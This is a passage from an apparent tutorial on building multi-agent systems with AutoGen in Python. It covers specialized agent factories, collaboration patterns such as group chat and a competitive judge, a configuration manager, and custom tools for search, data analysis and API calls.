            - Ensure code is correct, efficient, and follows best practices
            - Include clear comments explaining complex logic
            - Consider edge cases and error handling
            - Focus on clean, maintainable structure
            - Test thoroughly and validate solutions
            """,
            llm_config=coding_config
        )
    
    def create_critic_agent(self) -> autogen.AssistantAgent:
        """Create a critic agent for evaluating solutions and identifying flaws."""
        critic_config = self.llm_config.copy()
        critic_config["temperature"] = min(critic_config.get("temperature", 0.7), 0.4)
        
        return autogen.AssistantAgent(
            name="CriticAgent",
            system_message="""You are a critical evaluation specialist who excels at identifying flaws and improvements.
            
            Your capabilities:
            1. Identifying logical flaws and inconsistencies in reasoning
            2. Spotting edge cases and potential failure modes in solutions
            3. Suggesting specific improvements to solutions
            4. Challenging assumptions and evaluating evidence
            5. Providing constructive criticism in a clear, actionable way
            
            When providing critique:
            - Be specific about what issues you've identified
            - Explain why each issue matters and its potential impact
            - Suggest concrete improvements, not just problems
            - Consider both major and minor issues
            - Be thorough but constructive in your feedback
            """,
            llm_config=critic_config
        )
    
    def create_pm_agent(self) -> autogen.AssistantAgent:
        """Create a project manager agent for coordinating multi-step tasks."""
        return autogen.AssistantAgent(
            name="ProjectManager",
            system_message="""You are a project management specialist who excels at organizing and coordinating complex tasks.
            
            Your capabilities:
            1. Breaking down complex problems into manageable steps
            2. Assigning appropriate tasks to different specialists
            3. Tracking progress and ensuring all aspects are addressed
            4. Synthesizing information from different sources
            5. Ensuring the final deliverable meets requirements
            
            When managing projects:
            - Start by clarifying the overall goal and requirements
            - Create a structured plan with clear steps
            - Determine what specialist skills are needed for each step
            - Monitor progress and adjust the plan as needed
            - Ensure all components are integrated into a cohesive final product
            """,
            llm_config=self.llm_config
        )
    
    def create_creative_agent(self) -> autogen.AssistantAgent:
        """Create a creative specialist for innovative solutions and content."""
        creative_config = self.llm_config.copy()
        creative_config["temperature"] = max(creative_config.get("temperature", 0.7), 0.8)
        
        return autogen.AssistantAgent(
            name="CreativeAgent",
            system_message="""You are a creative specialist who excels at generating innovative ideas and content.
            
            Your capabilities:
            1. Generating novel approaches to problems
            2. Creating engaging and original content
            3. Thinking outside conventional frameworks
            4. Connecting disparate concepts in insightful ways
            5. Developing unique perspectives and innovative solutions
            
            When approaching creative tasks:
            - Consider unconventional approaches and perspectives
            - Look for unexpected connections between concepts
            - Blend different ideas to create something new
            - Balance creativity with practicality and relevance
            - Iterate and refine creative concepts
            """,
            llm_config=creative_config
        )
```

**2. Creating Agent Groups with Different Collaboration Patterns**

```python
# agent_framework/agent_groups.py
import autogen
from typing import Dict, List, Any, Optional
from .specialized_agents import SpecializedAgentFactory

class AgentGroupFactory:
    """Factory for creating different configurations of agent groups."""
    
    def __init__(self, llm_config: Dict[str, Any]):
        """Initialize with base LLM configuration."""
        self.llm_config = llm_config
        self.agent_factory = SpecializedAgentFactory(llm_config)
    
    def create_sequential_group(self, user_proxy=None) -> Dict[str, Any]:
        """
        Create a group of agents that work in sequence.
        
        Returns:
            Dictionary with agents and execution manager
        """
        if user_proxy is None:
            user_proxy = self._create_default_user_proxy()
        
        # Create specialized agents
        research_agent = self.agent_factory.create_research_agent()
        reasoning_agent = self.agent_factory.create_reasoning_agent()
        critic_agent = self.agent_factory.create_critic_agent()
        
        # Return the agents and a function to execute them in sequence
        return {
            "user_proxy": user_proxy,
            "agents": {
                "research": research_agent,
                "reasoning": reasoning_agent,
                "critic": critic_agent
            },
            "execute": lambda problem: self._execute_sequential_workflow(
                user_proxy=user_proxy,
                research_agent=research_agent,
                reasoning_agent=reasoning_agent,
                critic_agent=critic_agent,
                problem=problem
            )
        }
    
    def create_groupchat(self, user_proxy=None) -> Dict[str, Any]:
        """
        Create a group chat with multiple specialized agents.
        
        Returns:
            Dictionary with group chat and manager
        """
        if user_proxy is None:
            user_proxy = self._create_default_user_proxy()
        
        # Create specialized agents
        research_agent = self.agent_factory.create_research_agent()
        reasoning_agent = self.agent_factory.create_reasoning_agent()
        creative_agent = self.agent_factory.create_creative_agent()
        critic_agent = self.agent_factory.create_critic_agent()
        pm_agent = self.agent_factory.create_pm_agent()
        
        # Create group chat
        groupchat = autogen.GroupChat(
            agents=[user_proxy, pm_agent, research_agent, reasoning_agent, creative_agent, critic_agent],
            messages=[],
            max_round=20,
            speaker_selection_method="round_robin"  # Options: "auto", "round_robin", "random"
        )
        
        manager = autogen.GroupChatManager(groupchat=groupchat, llm_config=self.llm_config)
        
        return {
            "user_proxy": user_proxy,
            "agents": {
                "pm": pm_agent,
                "research": research_agent,
                "reasoning": reasoning_agent,
                "creative": creative_agent,
                "critic": critic_agent
            },
            "groupchat": groupchat,
            "manager": manager,
            "execute": lambda problem: self._execute_groupchat(
                user_proxy=user_proxy,
                manager=manager,
                problem=problem
            )
        }
    
    def create_hierarchical_team(self, user_proxy=None) -> Dict[str, Any]:
        """
        Create a hierarchical team with a manager and specialized agents.
        
        Returns:
            Dictionary with team structure and execution function
        """
        if user_proxy is None:
            user_proxy = self._create_default_user_proxy()
        
        # Create specialized agents
        pm_agent = self.agent_factory.create_pm_agent()
        research_agent = self.agent_factory.create_research_agent()
        reasoning_agent = self.agent_factory.create_reasoning_agent()
        coding_agent = self.agent_factory.create_coding_agent()
        critic_agent = self.agent_factory.create_critic_agent()
        creative_agent = self.agent_factory.create_creative_agent()
        
        # Define the team hierarchy
        team = {
            "manager": pm_agent,
            "specialists": {
                "research": research_agent,
                "reasoning": reasoning_agent,
                "coding": coding_agent,
                "creativity": creative_agent,
                "critique": critic_agent
            }
        }
        
        return {
            "user_proxy": user_proxy,
            "team": team,
            "execute": lambda problem: self._execute_hierarchical_team(
                user_proxy=user_proxy,
                team=team,
                problem=problem
            )
        }
    
    def create_competitive_evaluation_team(self, user_proxy=None) -> Dict[str, Any]:
        """
        Create a competitive setup where multiple agents solve a problem 
        and a judge evaluates their solutions.
        
        Returns:
            Dictionary with team structure and execution function
        """
        if user_proxy is None:
            user_proxy = self._create_default_user_proxy()
        
        # Create specialized solution agents
        reasoning_agent = self.agent_factory.create_reasoning_agent()
        creative_agent = self.agent_factory.create_creative_agent()
        research_agent = self.agent_factory.create_research_agent()
        
        # Create judge agent with specific configuration for evaluation
        judge_config = self.llm_config.copy()
        judge_config["temperature"] = 0.2  # Low temperature for consistent evaluation
        
        judge_agent = autogen.AssistantAgent(
            name="JudgeAgent",
            system_message="""You are an evaluation judge who assesses solutions objectively based on accuracy, 
            completeness, efficiency, innovation, and practicality.
            
            Your task is to:
            1. Evaluate each proposed solution based on clear criteria
            2. Identify strengths and weaknesses of each approach
            3. Select the best solution or suggest a hybrid approach combining strengths
            4. Provide clear reasoning for your evaluation decisions
            5. Be fair, impartial, and thorough in your assessment
            
            Your evaluation should be structured, criteria-based, and focused on the quality of the solution.
            """,
            llm_config=judge_config
        )
        
        return {
            "user_proxy": user_proxy,
            "solution_agents": {
                "reasoning": reasoning_agent,
                "creative": creative_agent,
                "research": research_agent
            },
            "judge": judge_agent,
            "execute": lambda problem: self._execute_competitive_evaluation(
                user_proxy=user_proxy,
                solution_agents=[reasoning_agent, creative_agent, research_agent],
                judge_agent=judge_agent,
                problem=problem
            )
        }
    
    # Helper methods for executing different group configurations
    
    def _create_default_user_proxy(self) -> autogen.UserProxyAgent:
        """Create a default user proxy agent."""
        return autogen.UserProxyAgent(
            name="User",
            human_input_mode="NEVER",
            max_consecutive_auto_reply=0,
            code_execution_config={"work_dir": "coding_workspace", "use_docker": False}
        )
    
    def _execute_sequential_workflow(self, user_proxy, research_agent, reasoning_agent, critic_agent, problem):
        """Execute a sequential workflow where agents work one after another."""
        # Step 1: Research gathers information
        user_proxy.initiate_chat(
            research_agent,
            message=f"I need you to research this problem thoroughly: {problem}\n\nGather relevant information, identify key concepts, and provide a comprehensive research summary."
        )
        
        # Extract research results from the last message
        research_results = None
        for message in reversed(user_proxy.chat_history):
            if message["role"] == "assistant" and message.get("name") == "ResearchAgent":
                research_results = message["content"]
                break
        
        # Step 2: Reasoning agent analyzes and solves
        user_proxy.initiate_chat(
            reasoning_agent,
            message=f"Based on this research: {research_results}\n\nPlease analyze and develop a solution to the original problem: {problem}"
        )
        
        # Extract solution from the last message
        solution = None
        for message in reversed(user_proxy.chat_history):
            if message["role"] == "assistant" and message.get("name") == "ReasoningAgent":
                solution = message["content"]
                break
        
        # Step 3: Critic evaluates the solution
        user_proxy.initiate_chat(
            critic_agent,
            message=f"Critically evaluate this solution to the problem: {problem}\n\nSolution: {solution}\n\nIdentify any flaws, weaknesses, or areas for improvement."
        )
        
        # Extract critique from the last message
        critique = None
        for message in reversed(user_proxy.chat_history):
            if message["role"] == "assistant" and message.get("name") == "CriticAgent":
                critique = message["content"]
                break
        
        # Return the complete workflow results
        return {
            "problem": problem,
            "research": research_results,
            "solution": solution,
            "critique": critique,
            "chat_history": user_proxy.chat_history
        }
    
    def _execute_groupchat(self, user_proxy, manager, problem):
        """Execute a group chat discussion to solve a problem."""
        # Start the group chat with the problem statement
        prompt = f"""
        Problem to solve: {problem}
        
        Please work together to solve this problem effectively. The ProjectManager should coordinate the process:
        
        1. Start by understanding and breaking down the problem
        2. The ResearchAgent should gather relevant information
        3. The ReasoningAgent should analyze the information and develop a solution approach
        4. The CreativeAgent should propose innovative perspectives or approaches
        5. The CriticAgent should evaluate the proposed solution and suggest improvements
        6. Finalize a comprehensive solution addressing all aspects of the problem
        
        Each agent should contribute based on their expertise. The final solution should be comprehensive, accurate, and well-reasoned.
        """
        
        user_proxy.initiate_chat(manager, message=prompt)
        
        # Extract the final solution from the chat history
        # (In a real implementation, you might want to look for a specific concluding message)
        solution_message = None
        for message in reversed(user_proxy.chat_history):
            # Look for a substantial message summarizing the solution
            if message["role"] == "assistant" and len(message["content"]) > 500:
                solution_message = message
                break
        
        solution = solution_message["content"] if solution_message else "No clear solution was reached."
        
        return {
            "problem": problem,
            "solution": solution,
            "chat_history": user_proxy.chat_history
        }
    
    def _execute_hierarchical_team(self, user_proxy, team, problem):
        """Execute a hierarchical team workflow with a manager coordinating specialists."""
        # Step 1: Manager creates a plan
        user_proxy.initiate_chat(
            team["manager"],
            message=f"We need to solve this problem: {problem}\n\nPlease create a detailed plan breaking this down into steps, indicating which specialist should handle each step: Research, Reasoning, Coding, Creativity, or Critique."
        )
        
        # Extract the plan from the last message
        plan = None
        for message in reversed(user_proxy.chat_history):
            if message["role"] == "assistant" and message.get("name") == "ProjectManager":
                plan = message["content"]
                break
        
        # Step 2: Execute the plan by working with specialists in sequence
        results = {"plan": plan, "specialist_outputs": {}}
        
        # This is a simplified version - in a real implementation, you would parse the plan 
        # and dynamically determine which specialists to call in which order
        specialists_sequence = [
            ("research", "Please research this problem and provide relevant information and context: " + problem),
            ("reasoning", "Based on our research, please analyze this problem and outline a solution approach: " + problem),
            ("coding", "Please implement the technical aspects of our solution approach to this problem: " + problem),
            ("creativity", "Please review our current approach and suggest any creative improvements or alternative perspectives: " + problem),
            ("critique", "Please review our complete solution and identify any issues or areas for improvement: " + problem)
        ]
        
        for specialist_key, message_text in specialists_sequence:
            specialist = team["specialists"][specialist_key]
            
            user_proxy.initiate_chat(
                specialist,
                message=message_text
            )
            
            # Extract specialist output
            specialist_output = None
            for message in reversed(user_proxy.chat_history):
                if message["role"] == "assistant" and message.get("name") == specialist.name:
                    specialist_output = message["content"]
                    break
            
            results["specialist_outputs"][specialist_key] = specialist_output
        
        # Step 3: Manager integrates all outputs into a final solution
        integration_message = f"""
        Now that all specialists have contributed, please integrate their work into a cohesive final solution to the original problem.
        
        Original problem: {problem}
        
        Specialist contributions:
        {json.dumps(results['specialist_outputs'], indent=2)}
        
        Please provide a comprehensive final solution that incorporates all relevant specialist input.
        """
        
        user_proxy.initiate_chat(team["manager"], message=integration_message)
        
        # Extract the final solution
        final_solution = None
        for message in reversed(user_proxy.chat_history):
            if message["role"] == "assistant" and message.get("name") == "ProjectManager":
                final_solution = message["content"]
                break
        
        results["final_solution"] = final_solution
        results["chat_history"] = user_proxy.chat_history
        
        return results
    
    def _execute_competitive_evaluation(self, user_proxy, solution_agents, judge_agent, problem):
        """Execute a competitive process where multiple agents propose solutions and a judge evaluates them."""
        # Step 1: Each solution agent develops their own approach
        solutions = {}
        
        for agent in solution_agents:
            user_proxy.initiate_chat(
                agent,
                message=f"Please solve this problem using your unique approach and expertise: {problem}\n\nProvide a comprehensive solution."
            )
            
            # Extract solution
            solution = None
            for message in reversed(user_proxy.chat_history):
                if message["role"] == "assistant" and message.get("name") == agent.name:
                    solution = message["content"]
                    break
            
            solutions[agent.name] = solution
        
        # Step 2: Judge evaluates all solutions
        evaluation_request = f"""
        Please evaluate the following solutions to this problem:
        
        Problem: {problem}
        
        {'-' * 40}
        
        """
        
        for agent_name, solution in solutions.items():
            evaluation_request += f"{agent_name}'s Solution:\n{solution}\n\n{'-' * 40}\n\n"
        
        evaluation_request += """
        Please evaluate each solution based on the following criteria:
        1. Accuracy and correctness
        2. Completeness (addresses all aspects of the problem)
        3. Efficiency and elegance
        4. Innovation and creativity
        5. Practicality and feasibility
        
        For each solution, provide a score from 1-10 on each criterion, along with a brief explanation.
        
        Then select the best overall solution OR propose a hybrid approach that combines the strengths of multiple solutions.
        
        Provide your detailed evaluation and final recommendation.
        """
        
        user_proxy.initiate_chat(judge_agent, message=evaluation_request)
        
        # Extract evaluation
        evaluation = None
        for message in reversed(user_proxy.chat_history):
            if message["role"] == "assistant" and message.get("name") == "JudgeAgent":
                evaluation = message["content"]
                break
        
        return {
            "problem": problem,
            "solutions": solutions,
            "evaluation": evaluation,
            "chat_history": user_proxy.chat_history
        }
```

**3. Configuring Advanced AutoGen Features**

```python
# agent_framework/advanced_config.py
import os
import json
import logging
from typing import Dict, List, Any, Optional

class AutoGenConfig:
    """Configuration manager for AutoGen multi-agent systems."""
    
    def __init__(self, config_path: Optional[str] = None):
        """
        Initialize AutoGen configuration.
        
        Args:
            config_path: Optional path to a JSON configuration file
        """
        self.logger = logging.getLogger("autogen_config")
        
        # Default configuration
        self.config = {
            "llm": {
                "config_list": [
                    {
                        "model": "gpt-4-turbo",
                        "api_key": os.environ.get("OPENAI_API_KEY", "")
                    }
                ],
                "temperature": 0.7,
                "request_timeout": 300,
                "max_tokens": 4000,
                "seed": None
            },
            "agents": {
                "termination": {
                    "max_turns": 30,
                    "terminate_on_keywords": ["FINAL ANSWER", "TASK COMPLETE"],
                    "max_consecutive_auto_reply": 10
                },
                "user_proxy": {
                    "human_input_mode": "NEVER",
                    "code_execution_config": {
                        "work_dir": "workspace",
                        "use_docker": False
                    }
                }
            },
            "logging": {
                "level": "INFO",
                "log_file": "autogen.log"
            },
            "caching": {
                "enabled": True,
                "cache_path": ".cache/autogen",
                "cache_seed": 42
            }
        }
        
        # Load configuration from file if provided
        if config_path and os.path.exists(config_path):
            self._load_config(config_path)
        
        # Setup logging
        self._setup_logging()
    
    def _load_config(self, config_path: str):
        """Load configuration from JSON file."""
        try:
            with open(config_path, 'r') as f:
                file_config = json.load(f)
            
            # Update config with file values (deep merge)
            self._deep_update(self.config, file_config)
            self.logger.info(f"Loaded configuration from {config_path}")
        except Exception as e:
            self.logger.error(f"Error loading configuration from {config_path}: {str(e)}")
    
    def _deep_update(self, d: Dict, u: Dict):
        """Recursively update a dictionary."""
        for k, v in u.items():
            if isinstance(v, dict) and k in d and isinstance(d[k], dict):
                self._deep_update(d[k], v)
            else:
                d[k] = v
    
    def _setup_logging(self):
        """Configure logging based on settings."""
        log_level = getattr(logging, self.config["logging"]["level"], logging.INFO)
        
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler(self.config["logging"]["log_file"])
            ]
        )
    
    def get_llm_config(self, agent_type: Optional[str] = None) -> Dict[str, Any]:
        """
        Get LLM configuration, optionally customized for a specific agent type.
        
        Args:
            agent_type: Optional agent type for specific configurations
            
        Returns:
            Dictionary with LLM configuration
        """
        base_config = {
            "config_list": self.config["llm"]["config_list"],
            "temperature": self.config["llm"]["temperature"],
            "request_timeout": self.config["llm"]["request_timeout"],
            "max_tokens": self.config["llm"]["max_tokens"]
        }
        
        # Add caching if enabled
        if self.config["caching"]["enabled"]:
            base_config["cache_seed"] = self.config["caching"]["cache_seed"]
        
        # Apply agent-specific customizations if needed
        if agent_type == "coding":
            base_config["temperature"] = min(base_config["temperature"], 0.3)
        elif agent_type == "creative":
            base_config["temperature"] = max(base_config["temperature"], 0.8)
        
        return base_config
    
    def get_termination_config(self) -> Dict[str, Any]:
        """Get termination configuration for conversations."""
        return self.config["agents"]["termination"]
    
    def get_user_proxy_config(self) -> Dict[str, Any]:
        """Get user proxy agent configuration."""
        return self.config["agents"]["user_proxy"]
    
    def get_work_dir(self) -> str:
        """Get the working directory for code execution."""
        return self.config["agents"]["user_proxy"]["code_execution_config"]["work_dir"]
    
    def save_config(self, config_path: str):
        """Save current configuration to a file."""
        try:
            os.makedirs(os.path.dirname(config_path), exist_ok=True)
            with open(config_path, 'w') as f:
                json.dump(self.config, f, indent=2)
            self.logger.info(f"Saved configuration to {config_path}")
        except Exception as e:
            self.logger.error(f"Error saving configuration to {config_path}: {str(e)}")
```

**4. Using Custom Tools with AutoGen**

```python
# agent_framework/custom_tools.py
import os
import json
import time
import logging
import requests
from typing import Dict, List, Any, Optional, Callable
from concurrent.futures import ThreadPoolExecutor

# Set up logging
logger = logging.getLogger("agent_tools")

class VectorDBTool:
    """Tool for interacting with vector databases for knowledge retrieval."""
    
    def __init__(self, api_key: str, api_url: str, embedding_model: str = "text-embedding-ada-002"):
        """
        Initialize the vector database tool.
        
        Args:
            api_key: API key for the vector database
            api_url: Base URL for the vector database API
            embedding_model: Model to use for embeddings
        """
        self.api_key = api_key
        self.api_url = api_url.rstrip('/')
        self.embedding_model = embedding_model
        self.headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {api_key}"
        }
    
    def search_knowledge_base(self, query: str, collection_name: str, limit: int = 5) -> List[Dict[str, Any]]:
        """
        Search the knowledge base for relevant documents.
        
        Args:
            query: The search query
            collection_name: Name of the collection to search
            limit: Maximum number of results to return
            
        Returns:
            List of relevant documents with their content and metadata
        """
        try:
            response = requests.post(
                f"{self.api_url}/search",
                headers=self.headers,
                json={
                    "query": query,
                    "collection_name": collection_name,
                    "limit": limit
                },
                timeout=30
            )
            
            response.raise_for_status()
            results = response.json().get("results", [])
            
            logger.info(f"Found {len(results)} documents matching query in collection {collection_name}")
            return results
            
        except Exception as e:
            logger.error(f"Error searching knowledge base: {str(e)}")
            return [{"error": str(e), "query": query}]
    
    def add_document(self, text: str, metadata: Dict[str, Any], collection_name: str) -> Dict[str, Any]:
        """
        Add a document to the knowledge base.
        
        Args:
            text: Document text
            metadata: Document metadata
            collection_name: Collection to add the document to
            
        Returns:
            Response with document ID and status
        """
        try:
            response = requests.post(
                f"{self.api_url}/documents",
                headers=self.headers,
                json={
                    "text": text,
                    "metadata": metadata,
                    "collection_name": collection_name
                },
                timeout=30
            )
            
            response.raise_for_status()
            result = response.json()
            
            logger.info(f"Added document {result.get('id')} to collection {collection_name}")
            return result
            
        except Exception as e:
            logger.error(f"Error adding document to knowledge base: {str(e)}")
            return {"error": str(e), "status": "failed"}


class WebSearchTool:
    """Tool for performing web searches and retrieving information."""
    
    def __init__(self, api_key: str, search_engine: str = "bing"):
        """
        Initialize the web search tool.
        
        Args:
            api_key: API key for the search service
            search_engine: Search engine to use (bing, google, etc.)
        """
        self.api_key = api_key
        self.search_engine = search_engine
        
        # Configure the appropriate API URL based on search engine
        if search_engine.lower() == "bing":
            self.api_url = "https://api.bing.microsoft.com/v7.0/search"
            self.headers = {
                "Ocp-Apim-Subscription-Key": api_key
            }
        elif search_engine.lower() == "google":
            self.api_url = "https://www.googleapis.com/customsearch/v1"
            # No headers for Google, API key is passed as a parameter
            self.headers = {}
        else:
            raise ValueError(f"Unsupported search engine: {search_engine}")
    
    def search(self, query: str, limit: int = 5) -> List[Dict[str, Any]]:
        """
        Perform a web search.
        
        Args:
            query: Search query
            limit: Maximum number of results to return
            
        Returns:
            List of search results with title, snippet, and URL
        """
        try:
            if self.search_engine.lower() == "bing":
                params = {
                    "q": query,
                    "count": limit,
                    "responseFilter": "Webpages",
                    "textFormat": "Raw"
                }
                response = requests.get(
                    self.api_url,
                    headers=self.headers,
                    params=params,
                    timeout=30
                )
                
                response.raise_for_status()
                results = response.json().get("webPages", {}).get("value", [])
                
                return [
                    {
                        "title": result.get("name", ""),
                        "snippet": result.get("snippet", ""),
                        "url": result.get("url", "")
                    }
                    for result in results
                ]
                
            elif self.search_engine.lower() == "google":
                params = {
                    "key": self.api_key,
                    "cx": "YOUR_CUSTOM_SEARCH_ENGINE_ID",  # Replace with your actual search engine ID
                    "q": query,
                    "num": limit
                }
                response = requests.get(
                    self.api_url,
                    params=params,
                    timeout=30
                )
                
                response.raise_for_status()
                results = response.json().get("items", [])
                
                return [
                    {
                        "title": result.get("title", ""),
                        "snippet": result.get("snippet", ""),
                        "url": result.get("link", "")
                    }
                    for result in results
                ]
            
            logger.info(f"Performed web search for '{query}' with {len(results)} results")
            return results
            
        except Exception as e:
            logger.error(f"Error performing web search: {str(e)}")
            return [{"error": str(e), "query": query}]


class DataAnalysisTool:
    """Tool for analyzing data and generating visualizations."""
    
    def __init__(self, work_dir: str = "data_analysis"):
        """
        Initialize the data analysis tool.
        
        Args:
            work_dir: Working directory for saving analysis outputs
        """
        self.work_dir = work_dir
        os.makedirs(work_dir, exist_ok=True)
    
    def analyze_data(self, data_json: str, analysis_type: str) -> Dict[str, Any]:
        """
        Analyze data and generate statistics.
        
        Args:
            data_json: JSON string containing data to analyze
            analysis_type: Type of analysis to perform (descriptive, correlation, etc.)
            
        Returns:
            Dictionary with analysis results
        """
        try:
            import pandas as pd
            import numpy as np
            
            # Parse the data
            try:
                # Try parsing as JSON
                data = json.loads(data_json)
                df = pd.DataFrame(data)
            except:
                # If not valid JSON, try parsing as CSV
                import io
                df = pd.read_csv(io.StringIO(data_json))
            
            results = {"analysis_type": analysis_type, "columns": list(df.columns)}
            
            # Perform the specified analysis
            if analysis_type == "descriptive":
                results["descriptive_stats"] = json.loads(df.describe().to_json())
                results["missing_values"] = df.isnull().sum().to_dict()
                results["data_types"] = {col: str(dtype) for col, dtype in df.dtypes.items()}
                
            elif analysis_type == "correlation":
                # Calculate correlations for numeric columns
                numeric_df = df.select_dtypes(include=[np.number])
                if not numeric_df.empty:
                    correlations = numeric_df.corr().to_dict()
                    results["correlations"] = correlations
                else:
                    results["correlations"] = {}
                    results["warning"] = "No numeric columns available for correlation analysis"
            
            elif analysis_type == "timeseries":
                # Check if there's a date/time column
                date_cols = [col for col in df.columns if df[col].dtype == 'datetime64[ns]' or 
                            'date' in col.lower() or 'time' in col.lower()]
                
                if date_cols:
                    date_col = date_cols[0]
                    if df[date_col].dtype != 'datetime64[ns]':
                        df[date_col] = pd.to_datetime(df[date_col], errors='coerce')
                    
                    df = df.sort_values(by=date_col)
                    df.set_index(date_col, inplace=True)
                    
                    # Get basic time series statistics
                    numeric_cols = df.select_dtypes(include=[np.number]).columns
                    results["timeseries_stats"] = {}
                    
                    for col in numeric_cols:
                        col_stats = {}
                        # Calculate trends
                        col_stats["trend"] = "increasing" if df[col].iloc[-1] > df[col].iloc[0] else "decreasing"
                        col_stats["min"] = float(df[col].min())
                        col_stats["max"] = float(df[col].max())
                        col_stats["start_value"] = float(df[col].iloc[0])
                        col_stats["end_value"] = float(df[col].iloc[-1])
                        col_stats["percent_change"] = float((df[col].iloc[-1] - df[col].iloc[0]) / df[col].iloc[0] * 100 if df[col].iloc[0] != 0 else 0)
                        
                        results["timeseries_stats"][col] = col_stats
                else:
                    results["warning"] = "No date/time columns identified for time series analysis"
            
            logger.info(f"Completed {analysis_type} analysis on data with {len(df)} rows")
            return results
            
        except Exception as e:
            logger.error(f"Error analyzing data: {str(e)}")
            return {"error": str(e), "analysis_type": analysis_type}
    
    def generate_visualization(self, data_json: str, viz_type: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate a visualization from data.
        
        Args:
            data_json: JSON string containing data to visualize
            viz_type: Type of visualization (bar, line, scatter, etc.)
            params: Additional parameters for the visualization
            
        Returns:
            Dictionary with path to visualization and metadata
        """
        try:
            import pandas as pd
            import matplotlib.pyplot as plt
            import seaborn as sns
            from matplotlib.figure import Figure
            
            # Set the style
            plt.style.use('ggplot')
            
            # Parse the data
            try:
                # Try parsing as JSON
                data = json.loads(data_json)
                df = pd.DataFrame(data)
            except:
                # If not valid JSON, try parsing as CSV
                import io
                df = pd.read_csv(io.StringIO(data_json))
            
            # Extract parameters
            x_column = params.get('x')
            y_column = params.get('y')
            title = params.get('title', f'{viz_type.capitalize()} Chart')
            xlabel = params.get('xlabel', x_column)
            ylabel = params.get('ylabel', y_column)
            figsize = params.get('figsize', (10, 6))
            
            # Create the figure
            fig = Figure(figsize=figsize)
            ax = fig.subplots()
            
            # Generate the specified visualization
            if viz_type == "bar":
                sns.barplot(x=x_column, y=y_column, data=df, ax=ax)
                
            elif viz_type == "line":
                sns.lineplot(x=x_column, y=y_column, data=df, ax=ax)
                
            elif viz_type == "scatter":
                hue = params.get('hue')
                if hue:
                    sns.scatterplot(x=x_column, y=y_column, hue=hue, data=df, ax=ax)
                else:
                    sns.scatterplot(x=x_column, y=y_column, data=df, ax=ax)
                
            elif viz_type == "histogram":
                bins = params.get('bins', 10)
                sns.histplot(df[x_column], bins=bins, ax=ax)
                
            elif viz_type == "heatmap":
                # For heatmap, we need a pivot table or correlation matrix
                corr = df.corr()
                sns.heatmap(corr, annot=True, cmap='coolwarm', ax=ax)
                
            else:
                raise ValueError(f"Unsupported visualization type: {viz_type}")
            
            # Set labels and title
            ax.set_title(title)
            ax.set_xlabel(xlabel)
            ax.set_ylabel(ylabel)
            
            # Save the figure
            timestamp = int(time.time())
            filename = f"{viz_type}_{timestamp}.png"
            filepath = os.path.join(self.work_dir, filename)
            fig.savefig(filepath, dpi=100, bbox_inches='tight')
            
            logger.info(f"Generated {viz_type} visualization and saved to {filepath}")
            
            return {
                "visualization_type": viz_type,
                "filepath": filepath,
                "title": title,
                "dimensions": {
                    "x": x_column,
                    "y": y_column
                },
                "data_shape": {
                    "rows": len(df),
                    "columns": len(df.columns)
                }
            }
            
        except Exception as e:
            logger.error(f"Error generating visualization: {str(e)}")
            return {"error": str(e), "visualization_type": viz_type}


class APIIntegrationTool:
    """Tool for interacting with external APIs."""
    
    def __init__(self, api_configs: Dict[str, Dict[str, Any]]):
        """
        Initialize the API integration tool.
        
        Args:
            api_configs: Dictionary mapping API names to their configurations
        """
        self.api_configs = api_configs
        self.session = requests.Session()
    
    def call_api(self, api_name: str, endpoint: str, method: str = "GET", 
                 params: Optional[Dict[str, Any]] = None, 
                 data: Optional[Dict[str, Any]] = None,
                 headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
        """
        Call an external API.
        
        Args:
            api_name: Name of the API (must be configured)
            endpoint: API endpoint to call
            method: HTTP method (GET, POST, etc.)
            params: Query parameters
            data: Request body for POST/PUT
            headers: Additional headers
            
        Returns:
            API response
        """
        if api_name not in self.api_configs:
            return {"error": f"API '{api_name}' not configured"}
        
        config = self.api_configs[api_name]
        base_url = config.get("base_url", "").rstrip('/')
        
        # Combine base headers with request-specific headers
        all_headers = config.get("headers", {}).copy()
        if headers:
            all_headers.update(headers)
        
        url = f"{base_url}/{endpoint.lstrip('/')}"
        
        try:
            response = self.session.request(
                method=method.upper(),
                url=url,
                params=params,
                json=data,
                headers=all_headers,
                timeout=config.get("timeout", 30)
            )
            
            response.raise_for_status()
            
            # Try to parse as JSON, fallback to text if not JSON
            try:
                result = response.json()
            except:
                result = {"text_response": response.text}
            
            logger.info(f"Successfully called {api_name} API: {endpoint}")
            return result
            
        except Exception as e:
            logger.error(f"Error calling {api_name} API: {str(e)}")
            return {
                "error": str(e),
                "api_name": api_name,
                "endpoint": endpoint,
                "status_code": getattr(e, 'response', {}).status_code if hasattr(e, 'response') else None
            }


# Integration with AutoGen - Function mapping for tools

def register_tools_with_agent(agent, tools_config: Dict[str, Any]) -> Dict[str, Callable]:
    """
    Register custom tools with an AutoGen agent.
    
    Args:
        agent: AutoGen agent
        tools_config: Tool configuration dictionary
        
    Returns:
        Dictionary mapping function names to tool functions
    """
    function_map = {}
    
    # Initialize vector database tool if configured
    if "vector_db" in tools_config:
        vector_db_config = tools_config["vector_db"]
        vector_db_tool = VectorDBTool(
            api_key=vector_db_config.get("api_key", ""),
            api_url=vector_db_config.get("api_url", ""),
            embedding_model=vector_db_config.get("embedding_model", "text-embedding-ada-002")
        )
        
        # Register vector database functions
        function_map["search_knowledge_base"] = vector_db_tool.search_knowledge_base
        function_map["add_document_to_knowledge_base"] = vector_db_tool.add_document
    
    # Initialize web search tool if configured
    if "web_search" in tools_config:
        web_search_config = tools_config["web_search"]
        web_search_tool = WebSearchTool(
            api_key=web_search_config.get("api_key", ""),
            search_engine=web_search_config.get("search_engine", "bing")
        )
        
        # Register web search functions
        function_map["web_search"] = web_search_tool.search
    
    # Initialize data analysis tool if configured
    if "data_analysis" in tools_config:
        data_analysis_config = tools_config["data_analysis"]
        data_analysis_tool = DataAnalysisTool(
            work_dir=data_analysis_config.get("work_dir", "data_analysis")
        )
        
        # Register data analysis functions
        function_map["analyze_data"] = data_analysis_tool.analyze_data
        function_map["generate_visualization"] = data_analysis_tool.generate_visualization
    
    # Initialize API integration tool if configured
    if "api_integration" in tools_config:
        api_integration_config = tools_config["api_integration"]
        api_integration_tool = APIIntegrationTool(
            api_configs=api_integration_config.get("api_configs", {})
        )
        
        # Register API integration functions
        function_map["call_api"] = api_integration_tool.call_api
    
    return function_map
```

